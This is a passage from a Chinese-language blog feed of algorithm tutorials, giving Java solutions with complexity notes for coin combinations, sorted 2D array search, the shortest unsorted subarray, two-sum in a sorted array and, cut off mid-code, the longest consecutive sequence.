        <content type="html"><![CDATA[<h2 id="硬币面值组合问题"><a href="#硬币面值组合问题" class="headerlink" title="硬币面值组合问题"></a>硬币面值组合问题</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一些面值不同的硬币，每一种面值的硬币都有无限多个，现在你要用这些硬币组成一个给定的数值，那么请问，总共有多少种可能的组合方式？</p><pre><code>比如说，给你的硬币有 1 分 2 分两种面值，现在你要用它们凑 4 分钱，有以下 3 种组合方式：4 = 1 + 1 + 1 + 14 = 1 + 1 + 24 = 2 + 2因此，要返回的答案是 3。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">coinCombination</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> coins<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">int</span> sum<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> coins<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      result <span class="token operator">+=</span> <span class="token function">coinCombination</span><span class="token punctuation">(</span>coins<span class="token punctuation">,</span> i<span class="token punctuation">,</span> sum <span class="token operator">-</span> coins<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">numberOfCoinCombinationRecursive</span><span class="token punctuation">(</span><span class="token keyword">int</span> sum<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> coins<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">coinCombination</span><span class="token punctuation">(</span>coins<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*sum), Space: O(n*sum)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">numberOfCoinCombinationDP</span><span class="token punctuation">(</span><span class="token keyword">int</span> sum<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> coins<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>coins<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>sum<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> coins<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> coins<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> sum<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> useCurCoin <span class="token operator">=</span> j <span class="token operator">>=</span> coins<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">?</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span>coins<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> useCurCoin<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> d<span class="token punctuation">[</span>coins<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">[</span>sum<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*sum), Space: O(sum)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">numberOfCoinCombinationDPOsum</span><span class="token punctuation">(</span><span class="token keyword">int</span> sum<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> coins<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>sum<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    d<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> coins<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> sum<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> useCurCoin <span class="token operator">=</span> j <span class="token operator">>=</span> coins<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">?</span> d<span class="token punctuation">[</span>j<span class="token operator">-</span>coins<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        d<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> d<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> useCurCoin<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> d<span class="token punctuation">[</span>sum<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>行列递增的二维数组搜索</title>
      <link href="/2019/01/06/suan-fa/shu-zu/xing-lie-di-zeng-de-er-wei-shu-zu-sou-suo/"/>
      <url>/2019/01/06/suan-fa/shu-zu/xing-lie-di-zeng-de-er-wei-shu-zu-sou-suo/</url>
      
        <content type="html"><![CDATA[<h2 id="行列递增的二维数组搜索"><a href="#行列递增的二维数组搜索" class="headerlink" title="行列递增的二维数组搜索"></a>行列递增的二维数组搜索</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个二维数组 matrix，和一个目标值 target。你要在数组里找到这个目标值，然后返回它的行/列下标。如果找不到，则返回 [-1,-1]。</p><p>这个数组的每一行都是从左向右递增，每一列都是从上到下递增。和「二维数组的二分搜索」不同，这道题目并不保证每一行的第一个数都比上一行的最后一个数要大。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二维数组是：1, 3, 52, 4, 6给你的目标值是 4。目标值 4 在这个数组中，找到后返回它的下标 [1, 1] 即可。如果给你的目标值是 100，显然它不在这个二维数组中，你要返回 [-1，-1]。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(m+n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">searchIn2DArray</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>matrix <span class="token operator">==</span> null <span class="token operator">||</span> matrix<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span>      matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> null <span class="token operator">||</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> matrix<span class="token punctuation">.</span>length<span class="token punctuation">,</span> n <span class="token operator">=</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> m <span class="token operator">&amp;&amp;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&lt;</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">--</span>j<span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">></span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">++</span>i<span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>i<span class="token punctuation">,</span> j<span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>需要排序的最短子数组</title>
      <link href="/2019/01/06/suan-fa/shu-zu/xu-yao-pai-xu-de-zui-duan-zi-shu-zu/"/>
      <url>/2019/01/06/suan-fa/shu-zu/xu-yao-pai-xu-de-zui-duan-zi-shu-zu/</url>
      
        <content type="html"><![CDATA[<h2 id="需要排序的最短子数组"><a href="#需要排序的最短子数组" class="headerlink" title="需要排序的最短子数组"></a>需要排序的最短子数组</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个整数数组，你要找到一个最短的子数组，只要把它按递增排序，那么整个数组就变成递增有序。最后返回这个最短子数组的长度。注意，子数组要求是连续的。</p><p>比如说，给你的数组是 0, 2, 4, 1, 8。我们至少需要把子数组 2, 4, 1 排序，变成 1, 2, 4，才能使得整个数组有序。因此要返回这个子数组的长度 3。</p><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n*log(n)), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">findUnsortedSubarrayBySorting</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sorted <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Arrays<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>sorted<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> sorted<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">++</span>i<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> sorted<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">--</span>j<span class="token punctuation">;</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>j <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">findUnsortedSubarrayTwoPass</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> n<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> nums<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">++</span>i<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">>=</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">--</span>j<span class="token punctuation">;</span>    <span class="token keyword">int</span> min <span class="token operator">=</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">,</span> max <span class="token operator">=</span> Integer<span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>      min <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>min<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// expand</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> min <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">--</span>i<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;</span> n <span class="token operator">&amp;&amp;</span> max <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">++</span>j<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// i+1 ~ j-1</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>j <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">findUnsortedSubarrayOnePass</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> min <span class="token operator">=</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">,</span> max <span class="token operator">=</span> Integer<span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>      max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">!=</span> max<span class="token punctuation">)</span> j <span class="token operator">=</span> k<span class="token punctuation">;</span>      <span class="token keyword">int</span> p <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> k<span class="token punctuation">;</span>      min <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>min<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">!=</span> min<span class="token punctuation">)</span> i <span class="token operator">=</span> p<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> j <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有序数组中求和为给定值的两个数</title>
      <link href="/2019/01/06/suan-fa/shu-zu/you-xu-shu-zu-zhong-qiu-he-wei-gei-ding-zhi-de-liang-ge-shu/"/>
      <url>/2019/01/06/suan-fa/shu-zu/you-xu-shu-zu-zhong-qiu-he-wei-gei-ding-zhi-de-liang-ge-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="有序数组中求和为给定值的两个数"><a href="#有序数组中求和为给定值的两个数" class="headerlink" title="有序数组中求和为给定值的两个数"></a>有序数组中求和为给定值的两个数</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个整数数组，并且这个数组是<strong>按递增排序</strong>的，你要找到数组中的两个整数，它们的和等于给定的目标值，然后返回它们的下标。题目假设给你的数组总是有且只有一个解，而且同一个元素不能使用两次。另外，<strong>返回结果的下标要从 1 开始</strong>。</p><pre class=" language-markdown"><code class="language-markdown">比如说给你的数组是：1, 2, 3, 6, 8, 11目标值是 10。那么，满足条件的两个整数是，2 和 8，它们的和是 10。所以你要返回它们的下标是 [2, 5]。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getTwoNumSumToGivenValue</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> numbers<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> numbers<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>numbers<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> numbers<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> target<span class="token punctuation">)</span> <span class="token operator">--</span>j<span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>numbers<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> numbers<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> target<span class="token punctuation">)</span> <span class="token operator">++</span>i<span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最长连续整数序列的长度</title>
      <link href="/2019/01/06/suan-fa/shu-zu/zui-chang-lian-xu-zheng-shu-xu-lie-de-chang-du/"/>
      <url>/2019/01/06/suan-fa/shu-zu/zui-chang-lian-xu-zheng-shu-xu-lie-de-chang-du/</url>
      
        <content type="html"><![CDATA[<h2 id="最长连续整数序列的长度"><a href="#最长连续整数序列的长度" class="headerlink" title="最长连续整数序列的长度"></a>最长连续整数序列的长度</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个无序的整数数组，你要找到数组中元素能够组成的最长连续整数序列，然后返回它的长度。</p><p>比如说，给你的数组是 8, 4, 2, 1, 2, 3, 6，这里面的数字能够组成的最长连续整数序列是 1, 2, 3, 4，因此你要返回它的长度 4。</p><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n*log(n)), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">lengthOfLongestConsecutiveSequenceSorting</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    Arrays<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token 